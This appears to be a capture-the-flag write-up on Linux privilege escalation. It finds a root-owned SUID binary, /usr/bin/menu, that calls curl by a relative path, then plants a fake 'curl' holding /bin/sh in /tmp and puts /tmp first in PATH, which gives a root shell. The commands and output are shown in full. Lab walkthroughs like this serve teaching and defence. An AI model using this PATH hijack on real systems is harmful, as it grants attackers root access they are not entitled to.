# Path Variable Manipulation 

### SUID / SGID / Stick bit explanation 

![https://i.imgur.com/LN2uOCJ.png](https://i.imgur.com/LN2uOCJ.png)

| Permission  | On Files  | On Directories  |
|---|---|---|
| SUID bit  | User executes the file with permissions of the file owner  | -  |
| SGID bit  | User executes the file with the permission of the group owner.  | File created in directory gets the same group owner.  |
| Sticky bit  | No meaning  | Users are prevented from deleting files from other users.  |

### Search for files that contain SUID bit

```bash
kenobi@kenobi:~$  find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```

Most of the above files look standard unix, however, /usr/bin/menu looks out of place.

## Examining /usr/bin/menu

Running the command 'strings' , this shows that the binary runs the commands, ipconfig, curl and uname. However, when menu calls this function they use the relative path rather than an absolute path. 

```bash
kenobi@kenobi:~$ ll -a /usr/bin/menu 
-rwsr-xr-x 1 root root 8880 Sep  4  2019 /usr/bin/menu*
```

Also it shows that the menu command runs as root.

## Getting a shell as root

Copy /bin/sh to current directory and rename as curl.

```bash
kenobi@kenobi:/tmp$ echo /bin/sh > curl 
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# whoami
root
# 
```